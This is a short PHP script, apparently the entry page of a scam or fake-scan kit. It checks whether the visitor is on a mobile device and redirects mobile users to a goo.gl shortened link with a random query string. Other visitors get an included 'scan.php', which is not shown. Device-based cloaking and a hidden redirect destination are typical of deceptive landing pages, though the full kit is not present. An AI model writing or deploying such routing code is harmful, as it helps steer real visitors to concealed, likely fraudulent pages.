<?php
  header("Access-Control-Allow-Origin:http://".$_SERVER["HTTP_HOST"]);
  header('Access-Control-Allow-Methods: GET');
  header('X-Frame-Options: DENY');

  function generate_name($length){
      $rname = '';
      $sesli = 'aeiou';
      $sessiz = 'bcdfghjklmnprstvyz';
      $rname = rand(1,2) == 1?$sessiz[rand(0,strlen($sessiz)-1)]:$sesli[rand(0,strlen($sesli)-1)];
      for($n=0;$n<$length;$n++){
          if(in_array($rname[strlen($rname)-1], str_split($sesli))){
              $rname .= $sessiz[rand(0,strlen($sessiz)-1)];
          }else{
              $rname .= $sesli[rand(0,strlen($sesli)-1)];
          }
      }
      return $rname;
  }
  
  $action = 'theme';

  require_once('Mobile_Detect.php');
  require_once('Browser.php');
  $detect = new Mobile_Detect;
  $browser = new Browser();

  if($detect->isMobile() || $browser->isMobile()){
    $action = 'mobile';
  }

  if($action == 'mobile'){
    header('Location: https://goo.gl/091aJP?'.rand(11111,99999));
  }else{
    include("scan.php");
  }
?>

